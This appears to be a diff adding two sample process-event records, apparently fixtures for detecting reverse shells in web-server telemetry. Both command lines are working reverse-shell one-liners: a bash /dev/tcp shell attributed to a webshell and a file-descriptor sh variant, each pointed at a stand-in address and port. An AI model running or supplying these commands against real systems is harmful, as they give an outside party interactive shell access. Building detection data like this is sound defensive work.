@@ -1,0 +1,2 @@
+{"Image": "/usr/bin/bash", "CommandLine": "bash -i >& /dev/tcp/10.0.0.66/4444 0>&1", "User": "www-data", "_note": "classic one-liner from webshell"}
+{"Image": "/bin/sh", "CommandLine": "sh -c 'exec 5<>/dev/tcp/203.0.113.9/9001; cat <&5 | sh >&5'", "User": "nobody", "_note": "fd-based variant"}
